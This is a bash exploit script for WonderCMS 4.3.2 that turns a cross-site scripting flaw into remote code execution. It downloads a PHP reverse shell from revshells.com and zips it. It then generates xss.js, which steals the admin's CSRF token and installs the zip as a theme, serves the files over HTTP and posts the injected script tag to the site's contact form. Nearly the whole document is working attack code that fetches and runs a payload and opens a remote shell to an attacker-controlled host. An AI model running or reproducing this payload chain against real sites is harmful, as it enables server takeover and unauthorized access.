#!/bin/bash

# Author: prodigiousMind (Enhanced by Divine Clown)
# Exploit: WonderCMS 4.3.2 XSS to RCE (Using reverse shell from revshells.com)

# Check if the required arguments (loginURL, IP, Port) are provided
if [ "$#" -ne 3 ]; then
  echo "Usage: $0 <loginURL> <IP_Address> <Port>"
  echo "Example: $0 http://localhost/wondercms/loginURL 192.168.29.165 5252"
  exit 1
fi

LOGIN_URL=$1
IP_ADDRESS=$2
PORT=$3
HOST=$(echo $LOGIN_URL | awk -F/ '{print $3}')

# Function to download reverse shell from revshells.com and create rev.php
download_reverse_shell() {
  local revshell_url="https://www.revshells.com/PHP%20PentestMonkey?ip=$IP_ADDRESS&port=$PORT&shell=sh&encoding=sh"
  echo "[+] Preparing to download the reverse shell zip file from: http://$IP_ADDRESS:8000/main.zip"
  curl -s "$revshell_url" -o rev.php
  
  if [ -f rev.php ]; then
    echo "[+] Reverse shell downloaded and saved as rev.php"
  else
    echo "[-] Failed to download reverse shell."
    exit 1
  fi
}

# Function to dynamically update rev.php with the provided IP and Port if needed
update_rev_php() {
  echo "[+] Updating rev.php with provided IP: $IP_ADDRESS and Port: $PORT"
  sed -i "s/\$ip\s*=\s*'.*';/\$ip = '$IP_ADDRESS';/" rev.php
  sed -i "s/\$port\s*=\s*.*;/\$port = $PORT;/" rev.php
  echo "[+] rev.php updated with the correct IP and Port."
}

# Function to create a ZIP file with the reverse shell
create_zip_file() {
  echo "[+] Creating ZIP file with rev.php..."
  mkdir -p revshell-main
  mv rev.php revshell-main/

  zip -r main.zip revshell-main/ > /dev/null 2>&1
  if [ -f main.zip ]; then
    echo "[+] main.zip created successfully."
  else
    echo "[-] Failed to create ZIP file."
    exit 1
  fi
  rm -r revshell-main
}

# Create the XSS payload dynamically using the ZIP file
create_xss_js() {
  cat <<EOF > xss.js
var url = "$LOGIN_URL";
if (url.endsWith("/")) {
  url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var token = document.querySelectorAll('[name="token"]')[0].value;
var zipInstallURL = urlWithoutLog + "/?installModule=http://$IP_ADDRESS:8000/main.zip&directoryName=revshell-main&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", zipInstallURL);
xhr3.send();
xhr3.onload = function() {
  if (xhr3.status == 200) {
    console.log("Payload installed. Triggering reverse shell...");
    var xhr4 = new XMLHttpRequest();
    xhr4.withCredentials = true;
    xhr4.open("GET", urlWithoutLog + "/themes/revshell-main/rev.php");
    xhr4.send();
    xhr4.onload = function() {
      if (xhr4.status == 200) {
        console.log("Reverse shell triggered.");
      }
    };
  }
};
EOF
  echo "[+] File created: xss.js"
}

# Function to check if nc listener is running on the specified port
check_nc_listener() {
  echo "[+] Checking if nc listener is running on port $PORT..."
  while ! lsof -i:$PORT | grep -q 'LISTEN'; do
    echo "[-] nc listener not running on port $PORT. Please start it with: nc -nvlp $PORT"
    sleep 5
  done
  echo "[+] nc listener is running on port $PORT. Continuing with the exploit..."
}

# Function to check and start the HTTP server, keeping the output active
start_http_server() {
  PORT=8000
  # Check if a Python server is already running and kill it
  pid=$(lsof -ti :$PORT)
  if [ -n "$pid" ]; then
    echo "[+] Port $PORT is in use by PID $pid. Killing the process..."
    kill -9 $pid
    echo "[+] Process $pid killed. Restarting the HTTP server..."
  else
    echo "[+] Port $PORT is available."
  fi

  # Start a new HTTP server and keep it running in the background
  echo "[+] Starting a simple HTTP server to serve the XSS payload in the background..."
  python3 -m http.server $PORT &
  SERVER_PID=$!
  echo "[+] HTTP server started with PID $SERVER_PID."
  sleep 2
}


# Function to send the XSS payload to the contact form automatically
send_xss_payload() {
  CONTACT_URL="http://$HOST/contact.php"
  XSS_PAYLOAD="\"><script src='http://$IP_ADDRESS:8000/xss.js'></script>"
  POST_DATA="name=faf&email=esfsf%40fe.sf&age=34&country=aef&website=$(printf "%s" "http%3A%2F%2F$HOST%2Findex.php%3Fpage%3DloginURL%3F%22%3E%3C%2Fform%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F$IP_ADDRESS%3A8000%2Fxss.js%22%3E%3C%2Fscript%3E%3Cform%2Baction%3D%22")"

  echo "[+] Sending XSS payload to $CONTACT_URL..."
  curl -s -X POST "$CONTACT_URL" -d "$POST_DATA" -H "Host: $HOST" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" -H "Origin: http://$HOST" -H "Connection: keep-alive" -H "Referer: http://$HOST/contact.php" -H "Upgrade-Insecure-Requests: 1" -b "PHPSESSID=npontvnmegcslfcd3ni2aihgvq" > /dev/null 2>&1
  echo "[+] XSS payload sent."
}

# Display info with the payload to use in the contact form
display_exploit_info() {
  echo "[+] Setting up reverse shell listener:"
  echo "Use the following command in your terminal: nc -nvlp $PORT"

  # Encode the XSS link for safe display
  XSS_LINK=$(printf "%s" "${LOGIN_URL//loginURL/index.php?page=loginURL?}\"></form><script+src=\"http://$IP_ADDRESS:8000/xss.js\"></script><form+action=\"")
  
  if [ -z "$XSS_SENT" ]; then
    echo "[+] Send the Request to the admin."
  else
    echo "[+] XSS payload has already been sent."
  fi
}

# Main logic
download_reverse_shell   # Download the reverse shell
update_rev_php           # Update rev.php with IP and port
create_zip_file          # Create the ZIP file
create_xss_js            # Create the XSS JavaScript payload
display_exploit_info     # Display the reverse shell info and XSS link

check_nc_listener        # Check if nc listener is running on the specified port
start_http_server        # Start the HTTP server interactively
send_xss_payload         # Automatically send the XSS payload
XSS_SENT=1

echo "Exploit complete. Waiting for the admin to trigger the payload it might take 1 or 2 Minutes."